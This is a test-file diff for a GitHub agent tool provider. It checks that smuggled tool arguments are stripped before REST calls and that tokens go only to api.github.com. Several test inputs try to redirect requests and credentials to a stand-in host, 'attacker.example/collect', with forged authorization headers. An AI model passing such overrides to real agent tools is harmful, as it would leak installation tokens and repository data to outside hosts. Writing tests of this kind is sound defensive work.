@@ -1177,6 +1177,249 @@ describe('github agent tool catalog', () => {
   });
 
   it.each([
+    'url',
+    'baseUrl',
+    'request',
+    'mediaType',
+    'headers',
+  ])('does not forward a caller-supplied %s on a GitHub REST tool', async (key) => {
+    const request = vi.fn(() => Promise.resolve({data: {number: 1}}));
+    const overrides: Record<string, unknown> = {
+      url: 'https://attacker.example/collect',
+      baseUrl: 'https://attacker.example/api/v3',
+      request: {redirect: 'follow'},
+      mediaType: {format: 'raw'},
+      headers: {accept: 'application/vnd.github.diff'},
+    };
+    const result = await callGithubToolWithRequest(
+      'issue_read',
+      {
+        method: 'get',
+        owner: 'shipfox',
+        repo: 'platform',
+        issue_number: 1,
+        [key]: overrides[key],
+      },
+      request,
+    );
+
+    expect(request).toHaveBeenCalledWith('GET /repos/{owner}/{repo}/issues/{issue_number}', {
+      owner: 'shipfox',
+      repo: 'platform',
+      issue_number: 1,
+    });
+    expect(result).toEqual({
+      content: [{type: 'text', text: '{"number":1}'}],
+      structuredContent: {number: 1},
+    });
+  });
+
+  it('drops undeclared arguments before a search request', async () => {
+    const request = vi.fn(() => Promise.resolve({data: {items: []}}));
+
+    await callGithubToolWithRequest(
+      'search_issues',
+      {
+        query: 'bug',
+        owner: 'shipfox',
+        repo: 'platform',
+        url: 'https://attacker.example/collect',
+        baseUrl: 'https://attacker.example/api/v3',
+        request: {redirect: 'follow'},
+        mediaType: {format: 'raw'},
+        headers: {authorization: 'token stolen'},
+      },
+      request,
+    );
+
+    expect(request).toHaveBeenCalledWith('GET /search/issues', {q: 'bug repo:shipfox/platform'});
+  });
+
+  it('drops undeclared arguments before a pull request write', async () => {
+    const request = vi.fn(() => Promise.resolve({data: {number: 3}}));
+
+    await callGithubToolWithRequest(
+      'create_pull_request',
+      {
+        owner: 'shipfox',
+        repo: 'platform',
+        title: 'Fix',
+        head: 'feature',
+        base: 'main',
+        url: 'https://attacker.example/collect',
+        baseUrl: 'https://attacker.example/api/v3',
+        request: {redirect: 'follow'},
+        mediaType: {format: 'raw'},
+        headers: {accept: 'application/vnd.github.diff'},
+      },
+      request,
+    );
+
+    expect(request).toHaveBeenCalledOnce();
+    expect(request).toHaveBeenCalledWith('POST /repos/{owner}/{repo}/pulls', {
+      owner: 'shipfox',
+      repo: 'platform',
+      title: 'Fix',
+      head: 'feature',
+      base: 'main',
+    });
+  });
+
+  it('sends the installation token to api.github.com from the real client', async () => {
+    const seen: Array<{url: string; authorization: string | null; accept: string | null}> = [];
+    vi.stubGlobal(
+      'fetch',
+      vi.fn((input: string | URL | Request, init?: RequestInit) => {
+        const url = input instanceof Request ? input.url : String(input);
+        const headers = new Headers(input instanceof Request ? input.headers : init?.headers);
+        seen.push({
+          url,
+          authorization: headers.get('authorization'),
+          accept: headers.get('accept'),
+        });
+        return new Response(JSON.stringify({number: 1}), {
+          status: 200,
+          headers: {'content-type': 'application/json'},
+        });
+      }),
+    );
+
+    const provider = new GithubAgentToolsProvider({
+      getInstallationByConnectionId: vi.fn(() => Promise.resolve(installation())),
+      tokenProvider: {
+        getInstallationAccessToken: vi.fn(() =>
+          Promise.resolve({
+            token: 'installation-token',
+            expiresAt: new Date(),
+            permissions: {issues: 'read' as const, pull_requests: 'read' as const},
+          }),
+        ),
+      },
+    });
+    const issueRead = githubAgentToolCatalog.find((entry) => entry.id === 'issue_read');
+    const pullRequestRead = githubAgentToolCatalog.find(
+      (entry) => entry.id === 'pull_request_read',
+    );
+    if (!issueRead || !pullRequestRead) throw new Error('Missing GitHub tools');
+    const session = await provider.openSession({
+      connection: connection(),
+      tools: [issueRead, pullRequestRead],
+      scope: undefined,
+    });
+
+    const read = await session.call({
+      toolId: 'issue_read',
+      arguments: {method: 'get', owner: 'shipfox', repo: 'platform', issue_number: 1},
+    });
+    const overridden = await session.call({
+      toolId: 'issue_read',
+      arguments: {
+        method: 'get',
+        owner: 'shipfox',
+        repo: 'platform',
+        issue_number: 1,
+        url: 'https://attacker.example/collect',
+        baseUrl: 'https://attacker.example/api/v3',
+      },
+    });
+    await session
+      .call({
+        toolId: 'pull_request_read',
+        arguments: {method: 'get_diff', owner: 'shipfox', repo: 'platform', pull_number: 2},
+      })
+      .catch(() => undefined);
+
+    expect(read).toMatchObject({structuredContent: {number: 1}});
+    expect(overridden).toMatchObject({structuredContent: {number: 1}});
+    expect(seen.map((call) => call.url)).toEqual([
+      'https://api.github.com/repos/shipfox/platform/issues/1',
+      'https://api.github.com/repos/shipfox/platform/issues/1',
+      'https://api.github.com/repos/shipfox/platform/pulls/2',
+    ]);
+    expect(seen.every((call) => call.authorization === 'token installation-token')).toBe(true);
+    expect(seen[2]?.accept).toBe('application/vnd.github.diff');
+    expect(seen.some((call) => call.url.includes('attacker.example'))).toBe(false);
+  });
+
+  it('keeps the pending-review abort signal on the real client', async () => {
+    let signal: AbortSignal | undefined;
+    vi.stubGlobal(
+      'fetch',
+      vi.fn((input: string | URL | Request, init?: RequestInit) => {
+        signal = (input instanceof Request ? input.signal : init?.signal) ?? undefined;
+        return new Response(JSON.stringify([]), {
+          status: 200,
+          headers: {'content-type': 'application/json'},
+        });
+      }),
+    );
+
+    const provider = new GithubAgentToolsProvider({
+      getInstallationByConnectionId: vi.fn(() => Promise.resolve(installation())),
+      tokenProvider: {
+        getInstallationAccessToken: vi.fn(() =>
+          Promise.resolve({
+            token: 'installation-token',
+            expiresAt: new Date(),
+            permissions: {pull_requests: 'write' as const},
+          }),
+        ),
+      },
+    });
+    const tool = githubAgentToolCatalog.find(
+      (entry) => entry.id === 'add_comment_to_pending_review',
+    );
+    if (!tool) throw new Error('Missing add_comment_to_pending_review tool');
+    const session = await provider.openSession({
+      connection: connection(),
+      tools: [tool],
+      scope: undefined,
+    });
+
+    await session
+      .call({
+        toolId: 'add_comment_to_pending_review',
+        arguments: {
+          owner: 'shipfox',
+          repo: 'platform',
+          pull_number: 2,
+          path: 'src/agent-tools.ts',
+          body: 'Please handle this error.',
+          subject_type: 'LINE',
+          line: 42,
+          side: 'RIGHT',
+        },
+      })
+      .catch(() => undefined);
+
+    expect(signal).toBeInstanceOf(AbortSignal);
+  });
+
+  it('sends only the diff accept header when get_diff arguments include transport overrides', async () => {
+    const request = vi.fn(() => Promise.resolve({data: 'diff --git a/file b/file'}));
+
+    await callGithubToolWithRequest(
+      'pull_request_read',
+      {
+        method: 'get_diff',
+        owner: 'shipfox',
+        repo: 'platform',
+        pull_number: 2,
+        url: 'https://attacker.example/collect',
+        headers: {authorization: 'token stolen', accept: 'application/vnd.github.diff'},
+      },
+      request,
+    );
+
+    expect(request).toHaveBeenCalledWith('GET /repos/{owner}/{repo}/pulls/{pull_number}', {
+      owner: 'shipfox',
+      repo: 'platform',
+      pull_number: 2,
+      headers: {accept: 'application/vnd.github.diff'},
+    });
+  });
+
+  it.each([
     {toolId: 'search_issues', outputKey: 'issues'},
     {toolId: 'search_pull_requests', outputKey: 'pull_requests'},
   ] as const)('builds a server-owned repository-scoped $toolId query', async ({
